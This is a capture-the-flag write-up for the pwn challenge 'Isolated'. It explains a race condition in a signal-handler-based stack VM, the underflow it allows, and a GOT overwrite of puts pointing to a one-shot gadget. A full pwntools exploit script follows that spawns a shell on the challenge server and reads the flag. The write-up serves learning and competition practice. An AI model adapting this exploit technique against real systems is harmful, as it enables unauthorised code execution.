# Isolated

**Author**: pql

**Tags:** pwn

**Points:** 884 (19 solves)

**Description:** 

> Simple VM, But isloated.

We're provided a small executable that `fork()`s and sets up a server-client relation, where the parent process acts as server that receives instructions from the client. We can provided `0x300` bytes of custom instructions that will be ran on the simple stack architecture VM that the server and client define together. The client and server share a memory mapping (with `MAP_SHARED`) that they will use for communication of routine arguments and results. 

#### The architecture



The server defines a few signal handlers that respectively push, pop and clean the stack, and one that enables "logging mode". The logging mode makes all other signal handlers print some debug information before executing. The stack has defined bounds at `stack_ptr = 0` and `stack_ptr = 768`, after which `pop` and `push` respectively will fail. 

The client is tasked with decoding the provided instructions, and then sends a signal to the parent process to execute a signal handler. The signal handler then executes, and a variable in the shared memory is set to indicate the result. It should be noted that the following seccomp policy is applied to the child:

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x03 0xc000003e  if (A != ARCH_X86_64) goto 0005
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x00 0x01 0x0000003e  if (A != kill) goto 0005
 0004: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0005: 0x06 0x00 0x00 0x00000001  return KILL
```

This hints us towards that fact that we should be exploiting the parent process.

There's a few defined instructions:

```
<0> <xx xx xx xx> pushes xx xx xx xx
<1> pops (into the void)

The next instructions can take either a 4-byte immediate or a value popped from the stack. 
A pop is denoted by <0x55> and an immediate is denoted by <0x66> <xx xx xx xx>. We'll call this a <imm/pop>

<2> <imm/pop> <imm/pop> adds two operands and pushes the result
<3> <imm/pop> <imm/pop> subtracts two operands and pushes the result
<4> <imm/pop> <imm/pop> multiplies two operands and pushes the result
<5> <imm/pop> <imm/pop> divides two operands and pushes the result
<6> <imm/pop> <imm/pop> compares if the two operands are equal and sets a flag if this is the case.

<7> <imm/pop> jumps to the operand
<8> <imm/pop> jumps to the operand IF the flag is set (see 6)
<9> cleans the stack
<10> <imm/pop> sets log mode to the operand (any non-zero value is on)

Anything else will kill parent and child immediately.
```

#### The bug

All pops and pushes are *blocking* (they wait for the result), except the normal push and pop instructions <0> and <1>. Since these instructions don't wait for the result, they can cause a desynchronization of state. We can trigger a signal handler in the parent whilst another signal handler is already running, which is effectively a kind of concurrence on a single execution core. We can use the resulting race condition to circumvent the bound check for `pop` and `push` in the parent process.

The resulting exploit underflows the stack pointer to -1, at which point we can navigate the stack pointer to a GOT entry (I picked `puts`) and use the add instruction (`<2>`) to add a constant offset to a one shot gadget to its lower four bytes.

Winning the race was mostly a bunch of trial and error, I combined `pop` with `clean_stack`, so the stack pointer will be zeroed but the `pop` routine will still decrement it. On local docker, i was able to win the race about 25% of the time, but on remote it is less than 1%.

#### The exploit

```python 
from pwn import *
from pwnlib.util.proc import descendants
context.terminal = ["terminator", "-e"]

BINARY_NAME = "./isolated"
LIBC_NAME = "./libc.so"
REMOTE = ("3.38.234.54", 7777)
DOCKER_REMOTE = ("127.0.0.1", 7777)

context.binary = BINARY_NAME
binary = context.binary
libc = ELF(LIBC_NAME)

EXEC_STR = [binary.path]

PIE_ENABLED = binary.pie

BREAKPOINTS = [int(x, 16) for x in args.BREAK.split(',')] if args.BREAK else []

gdbscript_break = '\n'.join([f"{'pie ' if PIE_ENABLED else ''}break *{hex(x)}" for x in BREAKPOINTS])

gdbscript = \
        """
        set follow-fork-mode child
        """


def handle():
    
    env = {"LD_PRELOAD": libc.path}
    
    if args.REMOTE:
        return remote(*REMOTE)
    
    elif args.LOCAL:
        p = process(EXEC_STR, env=env)
    elif args.GDB:        
        p = gdb.debug(EXEC_STR, env=env, gdbscript=gdbscript_break + gdbscript)
    
    elif args.DOCKER:
        p = remote(*DOCKER_REMOTE)
    else:
        error("No argument supplied.\nUsage: python exploit.py (REMOTE|LOCAL) [GDB] [STRACE]") 
    
    if args.STRACE:
        subprocess.Popen([*context.terminal, f"strace -p {p.pid}; cat"])
        input("Waiting for enter...")
    
    return p

def main():
    l = handle()
    #print(l.pid)
    """
    <0> <xx xx xx xx> pushes xx xx xx xx
    <1> pops (into the void)

    The next instructions can take either a 4-byte immediate or a value popped from the stack. 
    A pop is denoted by <0x55> and an immediate is denoted by <0x66> <xx xx xx xx>. We'll call this a <imm/pop>

    <2> <imm/pop> <imm/pop> adds two operands and pushes the result
    <3> <imm/pop> <imm/pop> subtracts two operands and pushes the result
    <4> <imm/pop> <imm/pop> multiplies two operands and pushes the result
    <5> <imm/pop> <imm/pop> divides two operands and pushes the result
    <6> <imm/pop> <imm/pop> compares if the two operands are equal and sets a flag if this is the case.

    <7> <imm/pop> jumps to the operand
    <8> <imm/pop> jumps to the operand IF the flag is set (see 6)
    <9> cleans the stack
    <10> <imm/pop> sets log mode to the operand (any non-zero value is on)

    anything else kills the parent immediately
    """

    ONE_GADGETS = [
        0x4f432,
        0x10a41c
    ]

    rel_og_offsets = [og - libc.symbols['puts'] for og in ONE_GADGETS];
    print(rel_og_offsets)

    dbg  = lambda x: [10, 0x66, *p32(x)]
    pop  = lambda: [1]
    cmp_pop_blocking = lambda y: [6, 0x55, 0x66, *p32(y)] # compares if popped value equal to 0 and sets flag
    push_blocking = lambda x: [2, 0x66, *p32(x), 0x66, *p32(0)] # adds
    jmp = lambda x: [7, 0x66, *p32(x)]
    clean_stack = lambda: [9]
    cmp_imm_imm = lambda: [6, 0x66, *p32(0x41414141), 0x66, *p32(0x41414142)]
    add_constant = lambda x: [2, 0x66, *p32(x & 0xffffffff), 0x55]

    payload = [*dbg(0x01)] # 6
    
    start = len(payload)

    offset = (0x203100 - binary.got['puts']) // 4
    print(offset)

    payload.extend([
        *push_blocking(1),
        *[*cmp_imm_imm() * 10],
        *pop(), *pop(),
        *clean_stack(),
        *[*cmp_imm_imm() * 10],
        *cmp_pop_blocking(0xffffffff),
        *dbg(1),
        *[*cmp_imm_imm() * 5],
        *[*push_blocking(-offset & 0xffffffff) * 2],
        *add_constant(rel_og_offsets[0]),
        *dbg(1), # get shell!
    ])


    payload.extend(jmp(len(payload)))
    
    print(len(payload))
    payload = bytes(payload)
    #print(hexdump(payload))
    l.recvuntil(b"opcodes >")

    l.send(payload)

    print(f"puts @ {hex(libc.symbols['puts'])}")
     
    time.sleep(3)
    l.sendline("cat flag")
    
    assert b"timeout" not in l.stream()

if __name__ == "__main__":
    main()
```
